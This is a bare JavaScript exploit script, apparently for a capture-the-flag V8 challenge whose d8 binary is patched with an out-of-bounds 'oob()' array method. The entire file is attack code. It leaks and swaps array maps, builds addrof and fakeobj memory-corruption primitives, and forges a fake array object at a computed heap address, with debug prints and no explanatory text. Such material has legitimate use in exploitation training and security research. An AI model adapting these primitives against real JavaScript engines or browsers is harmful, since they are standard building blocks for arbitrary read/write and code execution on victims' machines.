/**
 * r --allow-natives-syntax --shell ../exp/exp1.js
 */

const array_buffer = new ArrayBuffer(8);
let data_view = new DataView(array_buffer);

let u2d = (value) => {
    data_view.setBigUint64(0, value);
    return data_view.getFloat64(0);
};

let d2u = (value) => {
    data_view.setFloat64(0, value);
    return data_view.getBigUint64(0);
};

let hex = (value) => {
    return '0x' + value.toString(16).padStart(16, "0");
}

let test_value = 123n;
console.log("test_value", u2d(test_value), d2u(u2d(test_value)));

let obj = {};
let float_array = [1.1];
let obj_array = [obj];
//----oob() => map----
let float_array_map = float_array.oob();
let obj_array_map = obj_array.oob();
% DebugPrint(float_array);
% DebugPrint(obj_array);

console.log("float_array_map", hex(d2u(float_array_map)));
console.log("obj_array_map", hex(d2u(obj_array_map)));

let address_of = (obj) => {
    float_array.oob(obj_array_map);
    float_array[0] = obj;
    float_array.oob(float_array_map);
    return d2u(float_array[0]);
};

let fake_obj = (address) => {
    obj_array.oob(float_array_map);
    obj_array[0] = u2d(address | 1n);
    obj_array.oob(obj_array_map);
    return obj_array[0];
};

let fake1 = [
    float_array_map,
    0,
    u2d(0x0deadbeefn),
    u2d(0x100000000n),  
];

% DebugPrint(fake1);
console.log("address_of(fake1)", hex(address_of(fake1)));

let fake1_obj = fake_obj(address_of(fake1) + 0x30n);
% DebugPrint(fake1_obj);
console.log("address_of(fake1_obj)", hex(address_of(fake1_obj)));
console.log(fake1_obj);


% SystemBreak();